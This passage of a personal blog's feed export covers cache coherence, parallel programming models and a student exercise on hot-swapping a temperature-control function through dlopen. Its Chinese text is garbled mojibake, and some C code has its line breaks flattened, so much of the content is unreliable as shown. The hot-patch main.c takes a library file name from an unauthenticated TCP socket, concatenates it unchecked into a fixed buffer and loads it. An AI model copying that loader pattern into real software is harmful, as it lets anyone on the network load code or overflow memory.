coherency)é—®é¢˜ï¼Œæ˜¯å†…å­˜ä¸€è‡´æ€§é—®é¢˜çš„ä¸€ç§ç‰¹æ®Šæƒ…å†µã€‚ä¸çº¿ç¨‹ç¼–ç¨‹ç±»ä¼¼ï¼Œéœ€è¦èƒ½å¤Ÿå¤„ç†å¹¶å‘é—®é¢˜å’ŒåŒæ­¥é—®é¢˜çš„ç¡¬ä»¶ã€‚å…¶å®æˆ‘æ˜¯å¾ˆæ‡µé€¼çš„ï¼Œå¤§æ¦‚æ„Ÿè§‰è¿™ä¸ªé—®é¢˜å¯èƒ½å¤šå°‘å’Œé”æœ‰ç‚¹å…³ç³»ã€‚ä½†æ˜¯ä¹¦ä¸Šè®²çš„ä¹Ÿä¸å¤ªæ¸…æ¥šï¼Œå°±å»æŸ¥äº†ä¸€ä¸‹ï¼Œæ€»è§‰å¾—è¿™ç¯‡æ–‡ç« è®²çš„ä¸é”™ã€‚ï¼ˆ<a href="https://blog.csdn.net/moyeshuier/article/details/103943355?spm=1001.2014.3001.5501%EF%BC%89%EF%BC%8C%E8%AF%BB%E5%AE%8C%E4%BA%86%E5%8F%91%E7%8E%B0%E8%80%81%E5%93%A5%E6%B2%A1%E7%BB%A7%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%8C%E4%BC%B0%E8%AE%A1%E6%98%AF%E9%B8%BD%E4%BA%86%EF%BC%8C%E6%88%91%E5%B0%B1%E6%9C%89%E6%89%BE%E4%BA%86%E6%89%BE%E5%86%99%E4%B8%80%E7%AF%87(https://www.cnblogs.com/dolphin0520/p/3920373.html)%E3%80%82%E5%8F%AF%E6%98%AF%E6%88%91%E8%BF%98%E6%98%AF%E6%B2%A1%E6%87%82%EF%BC%8C%E8%BF%99%E4%B8%9C%E8%A5%BF%E9%9C%80%E8%A6%81%E6%88%91%E7%AE%A1%E4%B8%8D%EF%BC%9F%E7%9B%B4%E5%88%B0%E6%88%91%E6%90%9C%E5%88%B0%E4%BA%86%E7%9F%A5%E4%B9%8E%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0(https://www.zhihu.com/question/277395220/answer/640204150)%E5%B0%B1%E6%98%AF%E8%AF%B4%EF%BC%8C%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E4%B8%8D%E9%9C%80%E8%A6%81%E6%88%91%E4%BB%AC%E6%93%8D%E5%BF%83%EF%BC%8C%E7%A1%AC%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%88%96%E8%80%85%E8%AF%B4%E6%90%9E%E5%BA%95%E5%B1%82%E7%9A%84%E5%B7%B2%E7%BB%8F%E6%95%B4%E4%BA%86%E4%B8%80%E5%A5%97%E5%8D%8F%E8%AE%AE%E6%88%96%E8%80%85%E6%96%B9%E6%B3%95%E4%BF%9D%E8%AF%81%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E3%80%82%E4%BD%86%E6%98%AF%E6%AD%A3%E5%A6%82%E4%B9%A6%E4%B8%AD%E8%AF%B4%E5%88%B0%E7%9A%84%60%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E6%98%AF%E5%86%85%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E9%97%AE%E9%A2%98%E7%9A%84%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5%60,%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E4%BF%9D%E8%AF%81%E7%9A%84%E6%98%AF%E9%A1%BA%E5%BA%8F%E4%B8%80%E8%87%B4%E6%80%A7%E8%80%8C%E9%9D%9E%E7%BA%BF%E6%80%A7%E4%B8%80%E8%87%B4%E6%80%A7%EF%BC%8C%E5%AF%B9%E4%BA%8E%E6%88%91%E8%BF%99%E7%A7%8D%E5%BE%88low%E7%9A%84%E7%A8%8B%E5%BA%8F%E7%8C%BF%E6%9D%A5%E8%AF%B4%EF%BC%8C%E5%86%99%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E7%9A%84%E6%98%AF%E7%BA%BF%E6%80%A7%E4%B8%80%E8%87%B4%E6%80%A7%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E6%88%91%E4%BB%8E%E5%BC%80%E5%A7%8B%E5%B0%B1%E6%B2%A1%E8%80%83%E8%99%91%E5%88%B0%EF%BC%8C%E6%88%91%E8%80%83%E8%99%91%E5%88%B0%E7%9A%84%E5%8F%AA%E6%98%AF%E7%BA%BF%E6%80%A7%E4%B8%80%E8%87%B4%E6%80%A7%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E3%80%82">https://blog.csdn.net/moyeshuier/article/details/103943355?spm=1001.2014.3001.5501ï¼‰ï¼Œè¯»å®Œäº†å‘ç°è€å“¥æ²¡ç»§ç»­æ›´æ–°ï¼Œä¼°è®¡æ˜¯é¸½äº†ï¼Œæˆ‘å°±æœ‰æ‰¾äº†æ‰¾å†™ä¸€ç¯‡(https://www.cnblogs.com/dolphin0520/p/3920373.html)ã€‚å¯æ˜¯æˆ‘è¿˜æ˜¯æ²¡æ‡‚ï¼Œè¿™ä¸œè¥¿éœ€è¦æˆ‘ç®¡ä¸ï¼Ÿç›´åˆ°æˆ‘æœåˆ°äº†çŸ¥ä¹è¿™ç¯‡æ–‡ç« (https://www.zhihu.com/question/277395220/answer/640204150)å°±æ˜¯è¯´ï¼Œç¼“å­˜ä¸€è‡´æ€§ä¸éœ€è¦æˆ‘ä»¬æ“å¿ƒï¼Œç¡¬ä»¶å·¥ç¨‹å¸ˆæˆ–è€…è¯´æåº•å±‚çš„å·²ç»æ•´äº†ä¸€å¥—åè®®æˆ–è€…æ–¹æ³•ä¿è¯ç¼“å­˜ä¸€è‡´æ€§ã€‚ä½†æ˜¯æ­£å¦‚ä¹¦ä¸­è¯´åˆ°çš„`ç¼“å­˜ä¸€è‡´æ€§æ˜¯å†…å­˜ä¸€è‡´æ€§é—®é¢˜çš„ä¸€ç§ç‰¹æ®Šæƒ…å†µ`,ç¼“å­˜ä¸€è‡´æ€§ä¿è¯çš„æ˜¯é¡ºåºä¸€è‡´æ€§è€Œéçº¿æ€§ä¸€è‡´æ€§ï¼Œå¯¹äºæˆ‘è¿™ç§å¾ˆlowçš„ç¨‹åºçŒ¿æ¥è¯´ï¼Œå†™ä¸ªç®€å•çš„å¤šçº¿ç¨‹éœ€è¦è€ƒè™‘çš„æ˜¯çº¿æ€§ä¸€è‡´æ€§ï¼Œè¿™ä¸ªç¼“å­˜ä¸€è‡´æ€§æˆ‘ä»å¼€å§‹å°±æ²¡è€ƒè™‘åˆ°ï¼Œæˆ‘è€ƒè™‘åˆ°çš„åªæ˜¯çº¿æ€§ä¸€è‡´æ€§å¦‚ä½•ä¿è¯ã€‚</a></p><pre><code>cache coherence å’Œ memory consistencyæ˜¯ä¸¤å›äº‹ã€‚cache coherenceå¯¹ç¨‹åºå‘˜æ¥è¯´æ˜¯é€æ˜çš„ï¼Œä½ å¯ä»¥å®Œå…¨ä¸å…³å¿ƒå®ƒçš„å­˜åœ¨ï¼›å®ƒæ‰€è§£å†³çš„é—®é¢˜ï¼Œæ˜¯ä¸€ä¸ªå†…å­˜é‡Œçš„å˜é‡ï¼Œè¢«å¤šä¸ªcacheæ‰€åŠ è½½ä¹‹åï¼Œä¸€ä¸ªCPU coreå»ä¿®æ”¹äº†è¿™ä¸ªå˜é‡å€¼ï¼Œå¦‚ä½•ä¼ æ’­åˆ°å…¶ä»–cacheä¸Šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰äº†cache coherenceä¹‹åï¼Œä½ å¯ä»¥æ”¾å¿ƒåœ°åœ¨ä¸€ä¸ªcoreé‡Œä¿®æ”¹å˜é‡ï¼Œå®ƒæ—©æ™šä¼šè¢«å¦ä¸€ä¸ªcoreè¯»åˆ°ã€‚ä½†æ˜¯ç¨‹åºå‘˜å…¶å®è¦æ±‚çš„ä¸ä»…äºæ­¤ï¼Œä½ å¯èƒ½è¦æ±‚ï¼Œåœ¨ä¸€ä¸ªcoreä¿®æ”¹äº†ä¸€ä¸ªå˜é‡ï¼Œå¦ä¸€ä¸ªcoreç«‹é©¬å°±èƒ½è¯»åˆ°ï¼›æˆ–è€…ä½ ä¿®æ”¹äº†ä¸¤ä¸ªå˜é‡ï¼Œä½ è¦æ±‚å¦ä¸€ä¸ªcoreåœ¨è¯»åˆ°è¿™ä¸¤ä¸ªå˜é‡çš„æ—¶å€™ï¼Œè¦æŒ‰ç…§ç›¸åŒçš„é¡ºåºï¼Œæ¯”å¦‚è¿™æ ·çš„ä»£ç ï¼šä½œè€…ï¼šhellocodeé“¾æ¥ï¼šhttps://www.zhihu.com/question/277395220/answer/393722704</code></pre><h3 id="1-4-å¹¶è¡Œç¼–ç¨‹æ¨¡å‹"><a href="#1-4-å¹¶è¡Œç¼–ç¨‹æ¨¡å‹" class="headerlink" title="1-4 å¹¶è¡Œç¼–ç¨‹æ¨¡å‹"></a>1-4 å¹¶è¡Œç¼–ç¨‹æ¨¡å‹</h3><p>å¹¶è¡Œç¼–ç¨‹æ¨¡å‹æ˜¯ç¡¬ä»¶å’Œå†…å­˜ä½“ç³»ç»“æ„çš„ä¸€ä¸ªæŠ½è±¡ã€‚ç†è®ºä¸Šå¯ä»¥åœ¨ä»»ä½•ç±»å‹çš„æœºå™¨ä¸Šå®ç°ã€‚ä¸å‰é¢çš„åˆ’åˆ†ç›¸æ¯”ï¼Œè¿™å†™ç¼–ç¨‹æ¨¡å‹å»ºç«‹åœ¨æ›´é«˜çš„å±‚æ¬¡ï¼Œè¡¨ç¤ºè½¯ä»¶è¦ä»¥ä½•ç§æ–¹å¼å®Œæˆå¹¶è¡Œè®¡ç®—ã€‚æ¯ä¸ªæ¨¡å‹åˆ†åˆ«æœ‰è‡ªå·±çš„æ–¹æ³•ä¸å…¶ä»–å¤„ç†å™¨å…±äº«ä¿¡æ¯ï¼Œæ¥è®¿é—®å†…å­˜å’Œåˆ’åˆ†å·¥ä½œã€‚</p><p>æ€»çš„æ¥è¯´åˆ†è¿™å‡ ä¸ªmodel</p><ul><li>  å…±äº«å†…å­˜æ¨¡å‹</li><li>  å¤šçº¿ç¨‹æ¨¡å‹</li><li>  æ¶ˆæ¯ä¼ é€’/åˆ†å¸ƒå¼å†…å­˜æ¨¡å‹</li><li>  æ•°æ®å¹¶è¡Œæ¨¡å‹</li></ul><p>æˆ‘æ„Ÿè§‰ä¹¦ä¸Šè¯´çš„å…¶å®å¹¶ä¸æ˜¯å¾ˆæ¸…æ¥šå¯¹äºåˆå­¦è€…æ¥è¯´ï¼Œç„¶åæˆ‘å°±å»æœäº†ä¸€ä¸‹æˆ‘èƒ½ç†è§£çš„ï¼ˆ<a href="https://www.ques10.com/p/36530/explain-the-various-types-of-parallel-programming-/%EF%BC%89">https://www.ques10.com/p/36530/explain-the-various-types-of-parallel-programming-/ï¼‰</a></p><p>å·®ä¸å°±æ˜¯</p><ul><li>  å…±äº«å†…å­˜æ¨¡å‹ï¼š</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210418205720950-1.png"></p><p>å°±æ˜¯æ¯ä¸ªcoreé‡Œå¯èƒ½æ²¡æœ‰è‡ªå·±ä¸“æœ‰çš„å†…å­˜ç©ºé—´ï¼Œå°±æ˜¯é‚£ç§åªå¯¹è‡ªå·±å¯è§çš„å†…å­˜ã€‚è€Œæ˜¯é‡‡å–å…±äº«ä¸€å—å†…å­˜ï¼Œæ‰€æœ‰coreéƒ½åœ¨è¿™ä¸ªå…±äº«ç©ºé—´å†…è¯»å†™ã€‚æ¯ä¸ªprocessçš„ç©ºé—´åˆä¸»ç¨‹åºåˆ†é…ã€‚å†æ‰§è¡Œç»“æŸç‹—ï¼Œè¿™äº›å­è¿›ç¨‹é‡æ–°åŠ å…¥ä¸»ç¨‹åºã€‚</p><p>ä¼˜ç‚¹ï¼šç¨‹åºå¼€å‘å¾ˆè½»æ¾ï¼Œä¸éœ€è¦è¿›ç¨‹é€šè®¯å’Œè¿›è¡Œæ•°æ®å…±äº«</p><p>ç¼ºç‚¹ï¼šç”¨æˆ·ä¸çŸ¥é“å˜é‡å­˜åœ¨é‚£ï¼Ÿï¼ˆæ²¡å¤ªæ‡‚ï¼‰</p><ul><li>  æ¶ˆæ¯ä¼ è¾“æ¨¡å‹</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210418210732237.png"></p><p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ä¸€å¥—æ•°æ®ï¼Œä»–ä»¬é—´æƒ³è¦äº¤æ¢æ•°æ®ä¹‹ç±»çš„ï¼Œå°±éœ€è¦è¿›ç¨‹é€šä¿¡ï¼Œæ¯ä¸ªå‘é€è¡Œä¸ºéƒ½éœ€è¦æœ‰å¯¹åº”çš„æ¥å—è¡Œä¸º</p><p>ä¼˜ç‚¹ï¼šæ•°æ®å¯ä»¥ä¸å—ä½ç½®é™åˆ¶å­˜å‚¨ï¼Œè¿›ç¨‹é—´é€šè®¯æ˜¯å¾ˆå®¹æ˜“çš„ã€‚MPIå¯ç”¨(MPIéš¾åº¦æå¤§æºœäº†æºœäº†)</p><p>ç¼ºç‚¹ï¼šå½“å‘é€æ²¡è¢«æ¥å—å°±ä¼šé˜»å¡å¯¼è‡´è¿›ç¨‹åœæ­¢è¿è¡Œ</p><ul><li>  çº¿ç¨‹æ¨¡å‹</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210418214020235-871x1024.png"></p><p>çº¿ç¨‹è¢«å®šä¹‰ä¸ºè¿›ç¨‹ä¸­çš„ä¸€å°æ®µåºåˆ—ã€‚ä¸åŒçš„çº¿ç¨‹å¯ä»¥åœ¨åŒä¸€ä¸ªcoreä¹Ÿå¯ä»¥åœ¨ä¸åŒcoreæ‰§è¡Œã€‚å¦‚æœthreadåœ¨ä¸åŒcoreè¢«æ‰§è¡Œï¼Œé‚£ä¹ˆä»–ä»¬çš„æ‰§è¡Œå…·æœ‰ä¸€è‡´æ€§ã€‚</p><p>ä¼˜ç‚¹ï¼šç¨‹åºå‘˜ä¸éœ€è¦è€ƒè™‘å¹¶è¡Œå¤„ç†</p><p>ç¼ºç‚¹ï¼šè¦æ³¨æ„è€ƒè™‘ä¸¤ä¸ªçº¿ç¨‹ä¸èƒ½åŒæ—¶æ›´æ–°å…±äº«çš„èµ„æºã€‚</p><ul><li>  æ•°æ®å¹¶è¡Œæ¨¡å‹</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/04/image-20210418214823439-1024x440.png"></p><p>æ•°æ®å¹¶è¡Œæ˜¯æœ€ç®€å•çš„ä¸€ç§å¹¶è¡Œã€‚åœ¨è¿™é‡Œæ•°æ®é›†åˆè¢«ç»„ç»‡ä¸ºä¸€ä¸ªå¸¸è§„çš„ç»“æ„ï¼Œæ¯”å¦‚è¯´æ•°ç»„ã€‚è®¸å¤šç¨‹åºå¯¹è¿™ä¸ªç»“æ„çš„ä¸åŒéƒ¨åˆ†æ–½ä»¥ç›¸åŒæ“ä½œã€‚è®¾æƒ³ä½ è¦æŠŠä¸¤ä¸ªéƒ½å…·æœ‰100ä¸ªå…ƒç´ çš„æ•°ç»„çš„å¯¹åº”é¡¹ç›¸åŠ å¹¶å°†ç»“æœå‚¨å­˜åœ¨æ–°çš„æ•°ç»„ã€‚å¦‚æœæœ‰4ä¸ªæ ¸å¿ƒï¼ˆprocessorï¼‰é‚£ä¹ˆæ¯ä¸ªæ ¸å¿ƒ(processor)éƒ½å¯ä»¥åš25æ¬¡è¿ç®—ã€‚P.Så°±è¿™ä¸ªæˆ‘è§‰å¾—æœ€å¥½ç†è§£emm</p><hr><p>2021/4/27 æ›´æ–°</p><p>æ‰¾åˆ°ä¸€ä¸ªè®²çš„éå¸¸å¥½çš„å„ç§ç›¸å…³æ¦‚å¿µçš„çŸ¥ä¹</p><p><a href="https://zhuanlan.zhihu.com/p/343232126">https://zhuanlan.zhihu.com/p/343232126</a></p><h2 id="ä¸Šè¿°å†…å®¹å¯ä»¥å½’çº³æ€»ç»“æˆä¸‹è¡¨ï¼š"><a href="#ä¸Šè¿°å†…å®¹å¯ä»¥å½’çº³æ€»ç»“æˆä¸‹è¡¨ï¼š" class="headerlink" title="ä¸Šè¿°å†…å®¹å¯ä»¥å½’çº³æ€»ç»“æˆä¸‹è¡¨ï¼š"></a><strong>ä¸Šè¿°å†…å®¹å¯ä»¥å½’çº³æ€»ç»“æˆä¸‹è¡¨ï¼š</strong></h2><table><thead><tr><th>å¹¶å‘ç±»å‹</th><th>åˆ‡æ¢æœºåˆ¶</th><th>CPUæ•°é‡</th><th>é€‚ç”¨åœºæ™¯</th><th>ä»£è¡¨Pythonåº“</th></tr></thead><tbody><tr><td>å¤šçº¿ç¨‹ï¼ˆæŠ¢å å¼å¤šä»»åŠ¡å¤„ç†ï¼‰</td><td>æ“ä½œç³»ç»Ÿå†³å®šä½•æ—¶åˆ‡æ¢ä»»åŠ¡</td><td>1ä¸ª</td><td>I/Oå¯†é›†å‹</td><td>_thread(å·²æ·˜æ±°ï¼‰, threading, cocurrent.futures, nornir</td></tr><tr><td>å¼‚æ­¥ï¼ˆåä½œå¼å¤šä»»åŠ¡å¤„ç†ï¼‰</td><td>ä»»åŠ¡æœ¬èº«å†³å®šä½•æ—¶åˆ‡æ¢</td><td>1ä¸ª</td><td>I/Oå¯†é›†å‹</td><td>asyncio, netdev, aiohttp, aioping, gevent, tornado, twisted</td></tr><tr><td>å¤šè¿›ç¨‹ ï¼ˆå¹¶è¡Œï¼‰</td><td>æ‰€æœ‰ä»»åŠ¡åŒæ—¶è¿è¡Œ</td><td>å¤šä¸ª</td><td>CPUå¯†é›†å‹</td><td>multiprocessing</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ç”±äºæˆ‘çš„pythonåŸºç¡€éƒ¨åˆ†å·²ç»è‡ªå­¦å®Œï¼Œä¹Ÿå†™è¿‡ä¸€äº›å¾ˆç®€å•çš„å°é¡¹ç›®ã€‚æ‰€ä»¥æˆ‘æƒ³å¯»æ‰¾ä¸€ç§æ–¹å¼æ¥æå‡ä¸€ä¸‹æˆ‘ç¼–ç¨‹çš„æ°´å¹³ã€‚åœ¨æ¥è§¦socketç¼–ç¨‹æ—¶ï¼Œæˆ‘ç¬¬</summary>
      
    
    
    
    <category term="Pythonå­¦ä¹ " scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>åˆè¯†dllçƒ­è¡¥ä¸</title>
    <link href="https://zwh-china.github.io/2021/03/31/%E5%88%9D%E8%AF%86dll%E7%83%AD%E8%A1%A5%E4%B8%81/"/>
    <id>https://zwh-china.github.io/2021/03/31/%E5%88%9D%E8%AF%86dll%E7%83%AD%E8%A1%A5%E4%B8%81/</id>
    <published>2021-03-30T18:39:18.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>å¯’å‡çš®æ¡ä¾ ç»™äº†æˆ‘ä¸ªå•å­éœ€æ±‚å¤§æ¦‚æ˜¯è¿™æ ·</p><p><a href="http://106.15.74.181/wp-content/uploads/2021/03/Assignment_2020-21-1.pdf">è‹±æ–‡åŸç‰ˆ<br>Assignment_2020-21-1</a><a href="http://106.15.74.181/wp-content/uploads/2021/03/Assignment_2020-21-1.pdf">ä¸‹è½½</a></p><p>ä¸­æ–‡ç¿»è¯‘ç‰ˆ</p><p><a href="http://106.15.74.181/wp-content/uploads/2021/03/Assignment_2020-21-%E4%B8%AD%E6%96%87%E6%8F%8F%E8%BF%B0.docx">Assignment_2020-21-ä¸­æ–‡æè¿°</a><a href="http://106.15.74.181/wp-content/uploads/2021/03/Assignment_2020-21-%E4%B8%AD%E6%96%87%E6%8F%8F%E8%BF%B0.docx">ä¸‹è½½</a></p><p>å¤§æ¦‚å°±æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªå·¥ä¸šæ§åˆ¶å™¨ï¼Œè¿™ä¸ªæ§åˆ¶å™¨åœ¨è¿è¡Œä¸­è‹¥æ”¶åˆ°æŸä¿¡å·ï¼Œåˆ™æ¸©åº¦ç®—æ³•éœ€è¦æ”¹å˜ï¼Œä½†æ˜¯ä¸èƒ½åœæœºï¼ŒåŒæ—¶éœ€è¦æ–°ç®—æ³•å’Œæ—§ç®—æ³•çš„äº¤æ¥æ˜¯æ¸è¿›çš„ã€‚å†é€šä¿—ç‚¹å°±æ˜¯åœ¨ä¸å…³é—­ç¨‹åºçš„æƒ…å†µä¸‹æ›¿æ¢å‡½æ•°ã€‚æœ€ååœ¨çš®æ¡ä¾ æŒ‡ç‚¹ä¸‹ï¼Œæˆ‘é€‰æ‹©ç”¨dll/soåŠ¨æ€åŠ è½½æ¥è§£å†³è¿™ä¸ªé—®é¢˜å…·ä½“ä»£ç å¦‚ä¸‹</p><p>main.c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;math.h&gt;#include &lt;unistd.h&gt;int control_function(const unsigned k, double* u)    &#123;*(u) = sin((double)k / 50.0);          // è®¡ç®—è®¾å¤‡çš„è¾“å…¥return 0;&#125;                            // control_function()int main() &#123;    unsigned t = 0;double u;while(1)       &#123;       if(control_function(t, &amp;u) == -1)&#123;printf(&quot;control_function failed\n&quot;);           exit(-1);           &#125;printf(&quot;%lf @ %u\n&quot;, u, t);               // æ¨¡æ‹Ÿè¯¥æ§åˆ¶å™¨çš„è¾“å…¥u åˆ°è®¾å¤‡           t++;                              // Increment time index           sleep(1);             // Sampling time... maybe 10-15 minutes in practice&#125;return 0;                     // Should never reach here!&#125;                           // main())</code></pre><p>è¿™ä¸ªuçš„å€¼å°±æ˜¯æ¨¡æ‹Ÿçš„æ¸©åº¦å€¼ï¼Œcontrol_functionå°±æ˜¯æ¸©åº¦æ§åˆ¶ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯éœ€è¦å¯ä»¥è¢«åŠ¨æ€æ›¿æ¢çš„</p><p>ä»¥ä¸‹æ˜¯æˆ‘çš„æ–¹æ¡ˆ</p><p>main.c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;string.h&gt;#define SERV_PORT 9000int(*old_control_function)(const unsigned , double*); // define the function pointerint(*control_function)(const unsigned , double*); // define the function pointer for progressive substitutionconst char* dllPath=&quot;./controller.so&quot;; // controller.so is the default so file for the program to run for the default algorithmint initialize_status=0 , no_load=1 , reload_status=0; //set default so file  detect reload so file status  control progressive stagedouble cnt=0.1;// misc variablesconst char dir_path[]=&quot;./&quot;;char new_file_path[2048];_Noreturn void * Listener()&#123;    struct sockaddr_in serv_addr,client_addr;    socklen_t addr_len;    char buf[2048];    //AF_INET:ipv4 SOCK_DGRAM 0: default protocol(udp/tcp)    int skt=socket(AF_INET,SOCK_STREAM,0);    bzero(&amp;serv_addr,sizeof(serv_addr));    serv_addr.sin_family=AF_INET;    serv_addr.sin_port=htons(SERV_PORT);    serv_addr.sin_addr.s_addr=htonl(INADDR_ANY);    bind(skt,(struct sockaddr *)&amp;serv_addr,sizeof(serv_addr));    listen(skt,10);    addr_len=sizeof(client_addr);    char reply[]=&quot;Successfully received your call\n&quot;;    char verify[]=&quot;Emergency\n&quot;;    char reply_verify[]=&quot;Please input new so file name\n&quot;;    memset(buf,&#39;\0&#39;,sizeof(buf));    while(1)    &#123;        int client_skt=accept(skt,(struct sockaddr *)&amp;client_addr,&amp;addr_len);        int len=recv(client_skt,buf,sizeof(buf),0);        printf(&quot;%s\n&quot;,buf);        printf(&quot;%s\n&quot;,verify);        len=send(client_skt,reply,strlen(reply),0);        //printf(&quot;strcmp(a, b) : %d\n&quot;, strcmp(buf, verify));        if(strcmp(buf,verify)==0)        &#123;            printf(&quot;will reload the so file for emergency situation\n&quot;);            len=send(client_skt,reply_verify,strlen(reply_verify),0);            memset(buf,&#39;\0&#39;,sizeof(buf));            len=recv(client_skt,buf,sizeof(buf),0);            strtok(buf,&quot;\n&quot;);            memcpy(new_file_path,dir_path,sizeof(dir_path));            strcat(new_file_path,buf);            initialize_status=0;        &#125;        memset(buf,&#39;\0&#39;,sizeof(buf));        close(client_skt);    &#125;&#125;int check_so()&#123;    old_control_function=control_function;    void *handle = dlopen((char *) dllPath, RTLD_LAZY);    if(no_load==0)    &#123;        printf(&quot;%s\n&quot;,new_file_path);        handle=dlopen((char *)new_file_path,RTLD_LAZY);    &#125;    if(!handle)    &#123;        printf(&quot;Error occurred while trying to load so file\n&quot;);        return -1;    &#125;    control_function=dlsym(handle,&quot;control_function&quot;);    if(!control_function)    &#123;        printf(&quot;error occurred while load the function\n&quot;);        return -1;    &#125;    if(no_load==0)    &#123;        reload_status=1;    &#125;    no_load=0;    return 0;&#125;int main()&#123;    unsigned t = 0;    double u;    pthread_t thread[1];    int res = pthread_create(&amp;thread[0], NULL, Listener,NULL);    while(1)    &#123;        if(initialize_status==0) // reload module        &#123;            if(check_so()!=0)            &#123;                if(no_load==1)                &#123;                    printf(&quot;Failed to initializing so file&quot;);                    return 0;                &#125;else                &#123;                    printf(&quot;Something went wrong while trying to replace so file\n&quot;);                &#125;            &#125;else printf(&quot;so file loaded successfully\n&quot;);            initialize_status=1;        &#125;        if(reload_status==1) // if reloaded so file enter progressive mode        &#123;            double temp1,temp2;            double mix_value;            old_control_function(t, &amp;temp1);            control_function(t, &amp;temp2);            printf(&quot;old function run result as %lf\n&quot;,temp1);            printf(&quot;new function run result as %lf\n&quot;,temp2);            mix_value=(1-cnt)*temp1+cnt*temp2;  // generate progressive value            cnt+=0.1;            printf(&quot;Progressive value for Emergency substitution is %lf @ %u\n&quot;, mix_value, t);            if(cnt&gt;=1)            &#123;                printf(&quot;progressive stage end here\n&quot;);                reload_status=0;   // end of progressive substitution            &#125;            t++;                              // Increment time index            sleep(1);            continue;        &#125;        if(control_function(t, &amp;u) == -1)        &#123;            printf(&quot;control_function failed\n&quot;);            exit(-1);        &#125;        printf(&quot;%lf @ %u\n&quot;, u, t);               // simulate input as u        t++;                              // Increment time index        sleep(1);             // Sampling time... maybe 10-15 minutes in practice    &#125;    return 0;                     // Should never reach here!&#125;                           // main())//gcc main.c -o -dl</code></pre><p>contrller.c (è€çš„æ¸©åº¦å‡½æ•°)</p><pre><code>#include &lt;math.h&gt;int control_function(const unsigned k, double* u)&#123;    *(u) = sin((double)k / 50.0);          // simulate input algorithm    return 0;&#125;//gcc -fPIC -shared controller.c -o controller.so -lm</code></pre><p>new_controller.cï¼ˆæ–°çš„æ¸©åº¦å‡½æ•°ï¼‰</p><pre><code>int control_function(const unsigned k, double* u)&#123;    *(u) = 3.141592;          // simulate input algorithm    return 0;&#125;//gcc -fPIC -shared new_controller.c -o new_controller.so -lm</code></pre><p>å°†å‡½æ•°æºä»£ç æå‰ç¼–è¯‘æˆåŠ¨æ€é“¾æ¥åº“ï¼Œåœ¨main.cå¯åŠ¨åä¼šé»˜è®¤åŠ è½½controller.soæ–‡ä»¶ï¼Œå½“ç¨‹åºç›‘å¬åˆ°socketè¢«é“¾æ¥ï¼Œç¡®è®¤éœ€è¦æ›´æ¢å¹¶å¾—åˆ°æ–‡ä»¶ånew_controller.soåä¾¿ä¼šåœ¨å·¥ä½œç›®å½•åŠ è½½ï¼ŒåŒæ—¶æ¸©åº¦å€¼ä¼šä¸º</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/%E5%9B%BE%E7%89%87.png"></p><p>å…¶ä¸­Î»æ˜¯å’Œæ—¶é—´ç›¸å…³çš„ç³»æ•°ï¼Œè¿™æ ·ä¾¿å¯ä»¥åšåˆ°æ¸è¿›å¼æ›¿æ¢çš„æ•ˆæœã€‚</p><hr><p>å…·ä½“çš„æŠ¥å‘Š</p><h3 id="course-exercise"><a href="#course-exercise" class="headerlink" title="course-exercise"></a>course-exercise</h3><h4 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h4><p>Detailed the function and how it does</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/Industrial-Controller-1024x362.png"></p><h4 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h4><h5 id="Using-memcpy-function"><a href="#Using-memcpy-function" class="headerlink" title="-Using memcpy function"></a>-Using memcpy function</h5><p>I assume the program is designed for a chemical industry machine which need the program to generate output to control the temperature. Maybe at one point the machine need to adjust the temperature function and during the process of substitution . This process can be regarded as a Hot Fix. To achieve this I came out many methods such as start another program from the previous one, recompile the program. And The Linux kernel has a function replacement function, such as the memcpy function. There are various versions. The performance of different versions is different in different CPUs. When the kernel starts, it will patch dynamically according to the type of CPU. The method is to add an empty instruction at the beginning of the memcpy function. The length of the instruction can put down a jump instruction. X86 has different lengths of empty instructions. Then, according to the specific CPU, select the fastest version of memcpy and jump to the new function. In this way, new and old code can coexist and jump to new code with jump command.</p><p><img src="https://www.ibm.com/developerworks/cn/linux/l-knldebug/images/2.gif" alt="img"></p><p>And to keep that work.</p><p>(1) When the original function is being 